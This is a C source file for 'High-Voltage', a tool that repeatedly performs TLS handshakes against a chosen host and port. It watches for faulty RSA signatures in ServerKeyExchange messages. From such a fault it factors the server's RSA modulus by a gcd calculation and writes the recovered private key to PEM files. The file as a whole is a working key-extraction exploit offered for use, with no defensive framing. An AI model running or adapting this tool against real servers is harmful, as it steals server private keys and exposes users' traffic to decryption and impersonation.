#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <assert.h>
#include <signal.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netdb.h>

#include <openssl/ssl.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/pem.h>
#include <openssl/conf.h>
#include <openssl/x509.h>
#include <openssl/buffer.h>
#include <openssl/x509v3.h>
#include <openssl/opensslconf.h>

#define n2s(c,s)        ((s=(((unsigned int)(c[0]))<< 8)| \
                            (((unsigned int)(c[1]))    )),c+=2)

char *host = NULL;
char *port = NULL;
char addrstr[100]; // ip address string after it is resolved
int use_tls12 = 0;
int forever = 0;

/* TLSv1.2 Padding */
unsigned char *enc_type = NULL;
unsigned int enc_len = 0;
const unsigned char sha1_der_encoded[] = "\x30\x21\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00\x04\x14";
const unsigned char sha224_der_encoded[] = "\x30\x29\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x04\x05\x00\x04\x18";
const unsigned char sha256_der_encoded[] = "\x30\x31\x30\x0D\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20";
const unsigned char sha384_der_encoded[] = "\x30\x41\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x02\x05\x00\x04\x30";
const unsigned char sha512_der_encoded[] = "\x30\x51\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x03\x05\x00\x04\x40";

/* function prototypes */
static void print_hex(const char *, const unsigned char *, int);
void intercept_callback(int write_p, int version, int content_type, const void *buf, size_t len, SSL *ssl, void *arg);
void init_openssl_library(void);
void print_error_string(unsigned long err, const char* const label);
const EVP_MD *tls12_get_hash(unsigned char);
int resolve_host(const char *, char *);
int create_socket(char *, int);
int RSA_padding_add_PKCS1_tls_12(unsigned char *, int, const unsigned char *, int);
int calculate_right_signature(SSL *, unsigned char *, int, unsigned char *);
int calculate_right_signature_tls_12(SSL *, unsigned char *, int, unsigned char *, const EVP_MD *);
int store_X(RSA *, unsigned char *, int, BIGNUM *);
int store_Y(unsigned char *, int, BIGNUM *);
int generate_priv_key(BIGNUM *, BIGNUM *, RSA *, BN_CTX *);
int generate_keys(BIGNUM *, BIGNUM *, RSA *);

const char* PREFERRED_CIPHERS =

/* TLS 1.2 only */
"ECDHE-RSA-AES256-GCM-SHA384:"
"ECDHE-RSA-AES128-GCM-SHA256:"

/* TLS 1.2 only */
//"DHE-RSA-AES256-GCM-SHA384:"
//"DHE-RSA-AES128-GCM-SHA256:"

/* TLS 1.0 only */
"DHE-RSA-AES256-SHA:"
"DHE-RSA-AES128-SHA:"

/* SSL 3.0 and TLS 1.0 */
"EDH-RSA-DES-CBC3-SHA:"
"DH-RSA-DES-CBC3-SHA";

int verbose = 0;

int resolve_host(const char *host, char *addrstr)
{
  struct addrinfo hints, *res;
  int errcode;
  void *ptr;

  memset (&hints, 0, sizeof (hints));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_flags |= AI_CANONNAME;

  errcode = getaddrinfo (host, NULL, &hints, &res);
  if (errcode != 0)
     return 0;

  ptr = &((struct sockaddr_in *) res->ai_addr)->sin_addr;
  inet_ntop (res->ai_family, ptr, addrstr, 100);

  return 1;
}

int create_socket(char *ip_string, int port)
{
   int sockfd;
   struct sockaddr_in dest_addr;

   sockfd = socket(AF_INET, SOCK_STREAM, 0);
   if (sockfd == -1)
     return sockfd;

   dest_addr.sin_family=AF_INET;
   dest_addr.sin_port=htons(port);
   dest_addr.sin_addr.s_addr = inet_addr(ip_string); //*(long*)(host->h_addr);

   memset(&(dest_addr.sin_zero), '\0', 8);

   if ( connect(sockfd, (struct sockaddr *) &dest_addr, sizeof(struct sockaddr)) == -1 ) 
   {
      close(sockfd);
      return -1;
   }

   return sockfd;
}

void init_openssl_library(void)
{
    (void)SSL_library_init();
    SSL_load_error_strings();
    OPENSSL_config(NULL);
}

void print_error_string(unsigned long err, const char* const label)
{
    const char* const str = ERR_reason_error_string(err);
    if(str)
        fprintf(stderr, "%s : %s\n", label, str);
    else
        fprintf(stderr, "%s failed: %lu (0x%lx)\n", label, err, err);
}

static void print_hex(const char *string, const unsigned char *blob, int len)
{
   int i = 0;

   printf("%s", string);
   for (i; i < len; i++)
      printf("%02X", blob[i]);

   printf("\n");
}

const EVP_MD *tls12_get_hash(unsigned char hash_alg)
{
   switch(hash_alg)
   {
      case TLSEXT_hash_sha1:
         enc_type = (unsigned char *)sha1_der_encoded;
         enc_len = 15;
         return EVP_sha1();
      case TLSEXT_hash_sha224:
         enc_type = (unsigned char *)sha224_der_encoded;
         enc_len = 19;
         return EVP_sha224();
      case TLSEXT_hash_sha256:
         enc_type = (unsigned char *)sha256_der_encoded;
         enc_len = 19;
         return EVP_sha256();
      case TLSEXT_hash_sha384:
         enc_type = (unsigned char *)sha384_der_encoded;
         enc_len = 19;
         return EVP_sha384();
      case TLSEXT_hash_sha512:
         enc_type = (unsigned char *)sha512_der_encoded;
         enc_len = 19;
         return EVP_sha512();
      default:
         return NULL;
   }
}

void intercept_callback(int write_p, int version, int content_type, const void *buf, size_t len, SSL *ssl, void *arg)
{
   unsigned char *c = (unsigned char *)buf; // c point to the whole SSL Message
   X509 *cert = NULL;
   EVP_PKEY *pkey = NULL;    
   BIGNUM *x = NULL;
   BIGNUM *y = NULL;
   char random_dir[16];

   /* Server Key Exchange */
   if (c[0] == '\x0c')
   {
      /* param points to the single message values */
      long v, n, param_len;
      int j;
   
      /* md_buf = the correct calculated message digest */ 
      unsigned char md_buf[EVP_MAX_MD_SIZE * 2];
      unsigned char *param; 
     
      if (verbose)
         printf("\tServer Key Exchange Detected\n");

      /* let's skip the first 4 bytes */
      param = c + 4;

      if (use_tls12)
      {
         n = len - 4;
 
         /* 
            At the end param will point to the signature
            c + 4 instead will point to the start point of our ECDHE_Server_Param
         */ 
         param_len = 4;
         if (param_len > n)
         {
            fprintf(stderr, "SSL Server Key Exchange Message Too Short\n");
            return;
         }
        
         if (verbose)
         {
            print_hex("\t\tCurve Type: ", param, 1);
            print_hex("\t\tNamed Curve: ", param+1, 2);
         }
         
         param+=3;
         v = *param;  

         if (v > n - param_len)
         {
            fprintf(stderr, "Server Key Exchange Message: Pubkey Value too long\n");
            return;
         }

         if (verbose)
            printf("\t\tPubkey Length: %d\n", v); 

         param+=1;
         param_len+=v;
         n-=param_len;

         if (verbose)
            print_hex("\t\tPubkey: ", param, v);
      
         param+=v;
      }
      /* if we are using TLS < 1.2 */
      else
      {     
         /* p Length + Data */
         param_len = 2;
         n2s(param, v);
         param_len += v;
         if (verbose)
         {
            printf("\t\tp Length: %d\n", v);
            print_hex("\t\tp Value: ", param, v);
         }

         /* g Length + Data */
         param += v;
         param_len += 2;
         n2s(param, v);
         param_len += v;
         if (verbose)
         {
            printf("\t\tg Length: %d\n", v);
            print_hex("\t\tg Value: ", param, v); 
         }

         /* pubKey Length + Data */
         param += v;
         param_len += 2;
         n2s(param, v);
         param_len += v;
         if (verbose)
         {
            printf("\t\tpubKey Length: %d\n", v);
            print_hex("\t\tpubKey Value: ", param, v);
         }

         /* Signature Length + Data */
         param += v;
         n2s(param, v);
         n-=2;
         if (verbose)
         {
            printf("\t\tSignature Length: %d\n", v);
            print_hex("\t\tSignature Value: ", param, v);
            printf("\t\tParam size: %d\n", param_len); 
         }
       
         if ((param_len + 2 + v) > len)
         {
            if (verbose)
               fprintf(stderr, "Malformed SSL Message received\n");

            return;
         }   

         /* length of signature */
         n = v;

         j = calculate_right_signature(ssl, c, param_len, (unsigned char *)&md_buf);
      }

      cert = SSL_get_peer_certificate(ssl);
      if (cert == NULL)
      {
         if (verbose)
            fprintf(stderr, "Failed to get the certificate\n");

         return;
      }
 
      /* Verify the signature by extracting the public key from the certificate */
      int pubkey_algonid = OBJ_obj2nid(cert->cert_info->key->algor->algorithm);
      if (pubkey_algonid == NID_rsaEncryption)
      {
         int i;
         pkey = X509_get_pubkey(cert);
         RSA *rsa_key = pkey->pkey.rsa;
         if (rsa_key == NULL)
         {
            if (verbose)
               fprintf(stderr, "unable to extract RSA public key\n");

            goto _free;
         }       

         if (use_tls12)
         {
           if (verbose)
           {
              print_hex("\t\tAlgorithm Hash: ", param, 1);
              print_hex("\t\tAlgorithm Signature: ", param+1, 1);
           }

           const EVP_MD *md = NULL;
           md = tls12_get_hash(param[0]);
           if (md == NULL)
           {
              printf("[ERROR]: Unrecognized Hashing Algorithm!!!\r\n"); 
              goto _free;
           }
           param+=2;
           n-=2;
 
           /* now v is the length of the signature */
           n2s(param, v);
           n-=2;      
 
           if (verbose)
           {
              printf("\t\tSignature length: %d\n", v);
              print_hex("\t\tSignature: ", param, v);       
           }
           
           j=EVP_PKEY_size(pkey);

           /* Check signature length. If n is 0 then signature is empty */
           if ((v != n) || (n > j) || (n <= 0))
           {
              printf("[ERROR]: TLS 1.2 Wrong Signature Length!!!\r\n");
              goto _free;
           }
 
           j = calculate_right_signature_tls_12(ssl, c, param_len, (unsigned char *)&md_buf, md); 

           EVP_MD_CTX md_ctx;
           EVP_MD_CTX_init(&md_ctx);
           EVP_VerifyInit_ex(&md_ctx, md, NULL);
           EVP_VerifyUpdate(&md_ctx, &(ssl->s3->client_random[0]), SSL3_RANDOM_SIZE);
           EVP_VerifyUpdate(&md_ctx, &(ssl->s3->server_random[0]), SSL3_RANDOM_SIZE);
           EVP_VerifyUpdate(&md_ctx, c + 4, param_len);
           i = EVP_VerifyFinal(&md_ctx, param, (int)n, pkey);

           EVP_MD_CTX_cleanup(&md_ctx);
         }
         /* almost done for the signature calculation if we are using TLS < 1.2 */
         else
            i = RSA_verify(NID_md5_sha1, md_buf, j, param, n, pkey->pkey.rsa);
         
         if (i != 1)
         {
            printf("SIGNATURE ERROR!!!\nThere is a failure on the signature. Let's try to recover the private key...\n");
            fflush(stdout);
            x = BN_new(); //x is the known plaintext
            if (!store_X(rsa_key, md_buf, j, x))
            {
               fprintf(stderr, "unable to populate X\n");
               goto _free;
            }
 
            y = BN_new(); //y is the faulty signature
            if (!store_Y(param, n, y))
            {
               fprintf(stderr, "unable to populate Y\n");
               goto _free;
            }

            /* quick and dirty: we need a random string */
            memset(&random_dir, '\0', 16);
            random_dir[0] = '.';
            random_dir[1] = '/';
            int k = 2;
            for (i = 0; i <= 5; i++)
            {
               sprintf(&random_dir[k], "%02x", ssl->s3->client_random[i+4]);
               k+=2;
            }
            if (verbose)
               printf("Random dir is %s\n", random_dir);

            mkdir(random_dir, 0700);
            chdir(random_dir);

            BIO *bp_cert = NULL;
            bp_cert = BIO_new_file("cert.pem", "w+");
            i = PEM_write_bio_X509(bp_cert, cert);
            if(i != 1)
            {
               fprintf(stderr, "Failed to create cert key file\n");
               goto _free;
            }
            BIO_free_all(bp_cert);

            /* 
               We have now all needed for trying to generate the private. If it goes well,
               true is returned then the program can be stopped. In contrary case we 
               have to loop again through the TLS handshakes 
            */ 
            if (!generate_keys(x, y, rsa_key))
            {
               fprintf(stderr, "error with keys generation\n");
               system("touch incomplete.txt");
               FILE *fp1 = fopen("host.txt", "w");
               fwrite(arg, 1, strlen(arg), fp1);
               fclose(fp1);
               chdir("..");
               goto _free;
            }

            /* getcwd() sorry for that... */
            printf("SUCCESS!!! You can find private.pem, public.pem and cert.pem here: %s\n", get_current_dir_name());
            
            FILE *fp2 = fopen("host.txt", "w");
            fwrite(arg, 1, strlen(arg), fp2);
            fclose(fp2);
            system("ls -l *.pem");
            chdir("..");

            /* I know it is inelegant */
            if (!forever)
            {
               kill(0, SIGKILL);
               exit(EXIT_SUCCESS);
            } 
         }
         else
         {
            if (verbose)
               printf("SIGNATURE CORRECTLY CALCULATED. LET'S HOPE IN THE NEXT HANDSHAKE\n");
         }
      }
      _free:
         EVP_PKEY_free(pkey); 
         X509_free(cert);     
         if (x)
            BN_free(x);
         if (y)
            BN_free(y);
         return;
   }
}


int RSA_padding_add_PKCS1_tls_12(unsigned char *to, int tlen, const unsigned char *from, int flen)
{
   int j;
   unsigned char *p;
 
   if (flen > (tlen-RSA_PKCS1_PADDING_SIZE))
   {
      fprintf(stderr, "[ERROR]: Padding TLS1.2 Data Too Large for Key Size\n");
      return(0);
   }
     
   p=(unsigned char *)to;
 
   *(p++)=0;
   *(p++)=1; 
 
   /* pad out with 0xff data */
   j=tlen-3-flen-enc_len;
   memset(p,0xff,j);
   p+=j;
   *(p++)='\0';
   memcpy(p, enc_type, enc_len);
   p+=enc_len;
   memcpy(p, from, (unsigned int)flen);

   return(1);
}

int calculate_right_signature_tls_12(SSL *ssl, unsigned char *c, int param_len, unsigned char *md_buf, const EVP_MD *md)
{
   unsigned int size = 0;
   unsigned char *q; // md_buf[EVP_MAX_MD_SIZE * 2];
   EVP_MD_CTX ctx;

   EVP_MD_CTX_init(&ctx);
   q = md_buf;

   EVP_DigestInit_ex(&ctx, md, NULL);
   EVP_DigestUpdate(&ctx, &(ssl->s3->client_random[0]), SSL3_RANDOM_SIZE);
   EVP_DigestUpdate(&ctx, &(ssl->s3->server_random[0]), SSL3_RANDOM_SIZE);
   EVP_DigestUpdate(&ctx, c + 4, param_len);
   EVP_DigestFinal_ex(&ctx, q, &size);
  
   if (verbose)
   {
      printf("Message Digest final size: %d\n", size);
      print_hex("Digest: ", md_buf, size);
   }

   EVP_MD_CTX_cleanup(&ctx);
   return size;
}

/* 
 calculate the right signature 
 return the size of the message digest  
*/
int calculate_right_signature(SSL *ssl, unsigned char *c, int param_len, unsigned char *md_buf)
{
   int num, j;
   unsigned int size;
   unsigned char *q; // md_buf[EVP_MAX_MD_SIZE * 2];
   EVP_MD_CTX ctx;

   EVP_MD_CTX_init(&ctx);

   j = 0;
   q = md_buf;
 
   for (num = 2; num > 0; num--)
   {
      EVP_DigestInit_ex(&ctx, (num == 2)
      		? ssl->ctx->md5 : ssl->ctx->sha1, NULL);
      EVP_DigestUpdate(&ctx, &(ssl->s3->client_random[0]),
      		SSL3_RANDOM_SIZE);
      EVP_DigestUpdate(&ctx, &(ssl->s3->server_random[0]),
      		SSL3_RANDOM_SIZE);
      EVP_DigestUpdate(&ctx, c + 4, param_len);
      EVP_DigestFinal_ex(&ctx, q, &size);
      q += size;
      j += size;
      if (verbose)
         printf("Digest Size: %d\n", size);
   }
   if (verbose)
   {
      printf("Message Digest final size: %d\n", j);
      print_hex("Digest: ", md_buf, 36);
   }
 
   EVP_MD_CTX_cleanup(&ctx); 
   return j;
}

int store_Y(unsigned char *param, int n, BIGNUM *y)
{
   if (BN_bin2bn(param, n, y) == NULL)
   {
      if (verbose)
         printf("Error to convert the faulty signature in a bignum\n");
      
      return 0;
   }

   if (verbose)   
      printf("Faulty Signature Payload: %s\n", BN_bn2hex(y));

   return 1;
}

int store_X(RSA *rsa_key, unsigned char *md_buf, int j, BIGNUM *x)
{
   unsigned char *pad_buf = NULL;
   int num = 0;
   int i;
    
   num = BN_num_bytes(rsa_key->n);
   pad_buf = OPENSSL_malloc(num);

   if (use_tls12)
      i = RSA_padding_add_PKCS1_tls_12(pad_buf, num, md_buf, j);
   else
      i = RSA_padding_add_PKCS1_type_1(pad_buf, num, md_buf, j);

   if (i != 1)
   {
      if (verbose)    
         printf("ERROR TO GENERATE PADDING OF X\n");

      return 0;
   }
   
   if (verbose)
   { 
      printf("Padding generated of length %d\n", num);
      print_hex("Padding Payload: ", pad_buf, num);
   }

   if (BN_bin2bn(pad_buf, num, x) == NULL)
   {
      if (verbose)   
         printf("Error to convert padding in a bignum\n");
      
      return 0;
   }

   if (verbose)
      printf("Padding Converted Payload: %s\n", BN_bn2hex(x));
   
   OPENSSL_free(pad_buf);
   return 1;
}

int generate_keys(BIGNUM *x, BIGNUM *y, RSA *rsa_key)
{
   BIGNUM *y_e, *o1, *n_prime;
   BN_CTX *_ctx = NULL;
   int ret = 1;

   if ((_ctx = BN_CTX_new()) == NULL)
   {
      if (verbose)
         printf("BN_CTX_new error\n");
      
      return 0;
   }

   /* calculate a prime of n */
   y_e = BN_new();
   o1 = BN_new();
   n_prime = BN_new();
   
   // y_e = y^e
   BN_mod_exp(y_e, y, rsa_key->e, rsa_key->n, _ctx);
   if (verbose)
   {
      printf("RSA->e = %s:%s\n\n", BN_bn2dec(rsa_key->e), BN_bn2hex(rsa_key->e));
      printf("y ^ e = %s\n\n", BN_bn2hex(y_e));
      printf("y ^ e calculated\n\n\n");
   }
   
   // o1 = y^e - x
   BN_sub(o1, y_e, x);
   if (verbose)   
   {    
      printf("y^e - x = %s\n\n", BN_bn2hex(o1));
      printf("y^2 - x calculated\n\n\n");
   }
   
   // n_prime = gcd(o1, n);
   BN_gcd(n_prime, o1, rsa_key->n, _ctx);   
   if (verbose)
   {
      printf("RSA->n = %s\n\n", BN_bn2hex(rsa_key->n));
      printf("N prime derived: %s\n", BN_bn2hex(n_prime));
   }
  
   /* calculate the other prime of n */   
   BIGNUM *second_prime = BN_new();
   BN_div(second_prime, o1, rsa_key->n, n_prime, _ctx);
   if (verbose)   
      printf("second prime = %s\n\n", BN_bn2hex(second_prime));

   /* now we can generate the private key */
   if (!generate_priv_key(n_prime, second_prime, rsa_key, _ctx))
      ret = 0;

   BN_free(y_e);
   BN_free(o1);
   BN_free(n_prime);
   BN_CTX_free(_ctx);

   return ret;
}

int generate_priv_key(BIGNUM *n_prime, BIGNUM *second_prime, RSA *rsa_key, BN_CTX *_ctx)
{
   BIGNUM *r0, *r1, *r2, *d;
   BIO *bp_public = NULL, *bp_private = NULL;
   RSA *r = NULL;
   RSA *priv_key = NULL;
   int i, ret = 1;

   if (verbose)
      printf("DERIVING THE PRIVATE KEY\n");
                  
   r0 = BN_new();
   r1 = BN_new();
   r2 = BN_new();
   d = BN_new();

   BN_sub(r1,n_prime,BN_value_one());
   BN_sub(r2,second_prime,BN_value_one());
   BN_mul(r0,r1,r2,_ctx);
   BN_mod_inverse(d,rsa_key->e,r0,_ctx);
   
   if (verbose)
   {
      printf("SIR AND MADAM, THE PRIVATE KEY is:\n\t %s\n\n", BN_bn2hex(d));
      printf("NOW WE ARE GOING TO GENERATE PUBLIC AND PRIVATE KEY FILES\n");
   }

   r = RSA_new();
   r->n=BN_new();
   r->d=BN_new();
   r->e=BN_new();
   r->p=BN_new();
   r->q=BN_new();
   r->dmp1=BN_new();
   r->dmq1=BN_new();
   r->iqmp=BN_new();

   BN_copy(r->e, rsa_key->e);
   BN_copy(r->n, rsa_key->n);
   BN_copy(r->p, n_prime);
   BN_copy(r->q, second_prime);
   BN_copy(r->d, d);

   /* calculate d mod (p-1) */
   BN_mod(r->dmp1,d,r1,_ctx);

   /* calculate d mod (q-1) */
   BN_mod(r->dmq1,d,r2,_ctx);

   /* calculate inverse of q mod p */
   BN_mod_inverse(r->iqmp,r->q,r->p,_ctx);

   /* save the private key */
   bp_private = BIO_new_file("private.pem", "w+");
   i = PEM_write_bio_RSAPrivateKey(bp_private, r, NULL, NULL, 0, NULL, NULL);
   if(i != 1)
   {
      if (verbose)
         printf("Failed to create private key file\n");
         
      ret = 0;
      goto _free;
   }
   BIO_free_all(bp_private);

   bp_private = BIO_new(BIO_s_file());
   if (!BIO_read_filename(bp_private, "./private.pem"))
   {
      if (verbose)
         printf("Error reading PEM RSA Private Key File\n");
        
      ret = 0;
      goto _free;
   }

   EVP_PKEY *pkey = PEM_read_bio_PrivateKey(bp_private, NULL, NULL, NULL);
   if (!pkey)
   {
      if (verbose)
         printf("Error parsing Private Key\n");
    
      ret = 0;
      goto _free;
   }
   BIO_free_all(bp_private);

   priv_key = EVP_PKEY_get1_RSA(pkey);
   EVP_PKEY_free(pkey);
   if (!priv_key)
   {
      if (verbose)
         printf("Error getting Private Key\n");
        
      ret = 0;
      goto _free;
   }

   /* save the public key */
   bp_public = BIO_new_file("public.pem", "w+");
   i = PEM_write_bio_RSA_PUBKEY(bp_public,priv_key);
   RSA_free(priv_key);
   if(i != 1)
   {
      if (verbose)
         printf("Failed to create public key file\n");

      ret = 0;
      goto _free;
   }
   BIO_free_all(bp_public);

   
   /* 
      double check if the private key and public key are mathemically tied each other
      by encrypting and decrypting a MAGIC value 
   */
  
   if (!encrypt_decrypt_test())
   {
      if (verbose)
         printf("private and public keys generated but unrelated\n");

     ret = 0;
   }
  
_free:
   RSA_free(r);
   BN_free(r0);
   BN_free(r1);
   BN_free(r2);
   BN_free(d);

   return ret;
}

int encrypt_decrypt_test()
{
   BIO *private_key = BIO_new(BIO_s_file());
   BIO *cert = BIO_new(BIO_s_file());
   X509 *x = NULL;
   EVP_PKEY *pkey=NULL;
   RSA *priv_key = NULL;
   RSA *pub_key = NULL;
   int len1, len2;
   unsigned char to_encrypt[] = "SUKA\0";
   unsigned char encrypted[4098]={};
   unsigned char decrypted[4098]={};

   if (!BIO_read_filename(private_key, "./private.pem"))
   {
        printf("Error reading PEM RSA Private Key File\n");
        return 0;
   }
 
   pkey = PEM_read_bio_PrivateKey(private_key, NULL, NULL, NULL);
   if (!pkey)
   {
        printf("Error parsing Private Key\n");
        return 0;
   }
   BIO_free_all(private_key);

   priv_key = EVP_PKEY_get1_RSA(pkey);
   EVP_PKEY_free(pkey);
   if (!priv_key)
   {
        printf("Error getting Private Key\n");
        return 0;
   }

   len1 = RSA_private_encrypt(5, to_encrypt, encrypted, priv_key, RSA_PKCS1_PADDING);
   if (len1 == -1)
   {
      printf("Error encrypting test message\n");
      return 0;
   }
   RSA_free(priv_key);
   
   if (verbose)
      printf("Encrypted payload of len: %d bytes\n", len1);

   if (!BIO_read_filename(cert, "./cert.pem"))
   {
        printf("Error reading PEM Cert File\n");
        return 0;
   }

   x = PEM_read_bio_X509_AUX(cert, NULL, NULL, NULL);
   if (x == NULL)
   {
        printf("Unable to load certificate\n");
        return 0;
   }
   BIO_free(cert); 

   pkey = X509_get_pubkey(x);
   X509_free(x);

   if (!pkey)
   {
        printf("Error parsing Pub Key from Certificate File\n");
        return 0;
   }
   pub_key = EVP_PKEY_get1_RSA(pkey);
   EVP_PKEY_free(pkey);
   if (!pub_key)
   {
        printf("Error getting Public Key\n");
        return 0;
   }

   len2 = RSA_public_decrypt(len1, encrypted, decrypted, pub_key, RSA_PKCS1_PADDING);
   if (len2 == -1)
   {
      printf("Error decrypting test message\n");
      return 0;
   }
   RSA_free(pub_key);

   if (verbose)
   { 
      printf("Decrypted payload of len: %d bytes\n", len2);
      printf("Decrypted payload: %s\n", decrypted);
   }
   
   if (!strncmp(decrypted, "SUKA", 4))
   {
      return 1;
   }
   else
      return 0;
}

void usage(char *arg)
{
   fprintf(stderr, "Usage: %s -h <host_name> -p <port> [-t] [-v] [-f] [-c num]\r\n", arg);
   fprintf(stderr, "-h: host or ip address to connect to\n");
   fprintf(stderr, "-p: tcp port to connect to (1-65535)\n");
   fprintf(stderr, "-t: use TLS_v1.2 (default: no)\n");
   fprintf(stderr, "-v: enable verbose mode (default: no)\n");
   fprintf(stderr, "-c: number of childs (default: 1)\n");
   fprintf(stderr, "-f: do not stop when a signature fault is found (default: no)\n");
}

void servetheservants()
{
    unsigned long ssl_err = 0;
    const SSL_METHOD *method = NULL;
    SSL_CTX* ctx = NULL;
    SSL *ssl = NULL;
    long res = 1;
    int i = 0;
    int fd;

    init_openssl_library();
    chdir("./results");    

    if (use_tls12)
    {    
       method = TLSv1_2_method(); 
    }
    else
    {
       method = TLSv1_method();
    }
  
    ssl_err = ERR_get_error();
     
    if(!(NULL != method))
    {
        printf("child [%d] - ", getpid());
        print_error_string(ssl_err, "TLSv1_method()");
        exit(EXIT_FAILURE);
    }
        
    ctx = SSL_CTX_new(method);
    ssl_err = ERR_get_error();
        
    if(!(ctx != NULL))
    {
        printf("child [%d] - ", getpid());
        print_error_string(ssl_err, "SSL_CTX_new()");
        exit(EXIT_FAILURE); 
    }
        
    SSL_CTX_set_msg_callback(ctx, intercept_callback);
    SSL_CTX_set_msg_callback_arg(ctx, host);
        
    const long flags = SSL_OP_ALL | SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_COMPRESSION;
    long old_opts = SSL_CTX_set_options(ctx, flags);
    
    res = SSL_CTX_set_cipher_list(ctx, PREFERRED_CIPHERS);    
    ssl_err = ERR_get_error();
        
    if(!(1 == res))
    {
       printf("child [%d] - ", getpid());
       print_error_string(ssl_err, "SSL_set_cipher_list()");
       SSL_CTX_free(ctx);
       exit(EXIT_FAILURE);
    }
   
    for (;;)
    {
       i++; 
       printf("[%d] - Establishing connection [%d]\n", getpid(), i);        

       ssl = SSL_new(ctx);
       if (ssl != NULL)
       {
          fd = create_socket(addrstr, atoi(port));
          if (fd == -1)
          {
             printf("[%d] - Error: Cannot establish a connection to host %s on port %d\n", getpid(), host, atoi(port));
             continue;
          }

          SSL_set_fd(ssl, fd);

          /* not interested in checking the values returned here. May be in the future */   
          res = SSL_connect(ssl);
          ssl_err = ERR_get_error();
          close(fd);
          SSL_free(ssl);
       }
    }

    /* this should be never reached */
    if(NULL != ctx)
       SSL_CTX_free(ctx);
}

int main(int argc, char* argv[])
{
    int i = 0;
    int c;
    int n_childs = 0;
    pid_t pid; 

    fprintf(stderr, "====================================================\n");
    fprintf(stderr, "High-Voltage© 0.5 - 2015 - multithread\nMarco 'segfault' Ortisi (Active Handshaker version)\n");
    fprintf(stderr, "====================================================\n\n");
 
    while ((c = getopt (argc, argv, "h:p:c:tvf")) != -1)
    switch (c)
    {
      case 'h':
        host = optarg;
        break;
      case 'p':
        port = optarg;
        break;
      case 'c':
        n_childs = atoi(optarg);
        break;
      case 't':
        use_tls12 = 1;
        break;
      case 'v':
        verbose = 1;
        break;
      case 'f':
        forever = 1;
        break;
      default:
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    if ((host == NULL) || (port == NULL) || (atoi(port) < 1) || (atoi(port) > 65535))
    {
       usage(argv[0]);
       exit(EXIT_FAILURE);
    }   

    if (!resolve_host(host, (char *)&addrstr))
    {
       printf("Error resolve_host()\n");
       exit(0);
    }

    if (!n_childs)
       n_childs = 1; 

    mkdir("./results", 0700);

    printf("Starting Handshakes:\n");
    printf("Host: %s (%s)\n", host, addrstr);
    printf("Port: %s\n", port);
    printf("Use TLSv1.2: %s\n", use_tls12 ? "yes" : "no");
    printf("Verbose no: %s\n", verbose ? "yes" : "no");
    printf("Child spawned: %d\n", n_childs);

    for (i = 0; i < n_childs; i++)
    {
       pid = fork();

       if (pid == 0)
       {
          servetheservants();
       } 
    }  

    for (;;)
    {
       pid = waitpid(-1, NULL, 0);
       if (pid != 0 && pid != -1)
          printf("PID %d exited\n", pid);
    }
}
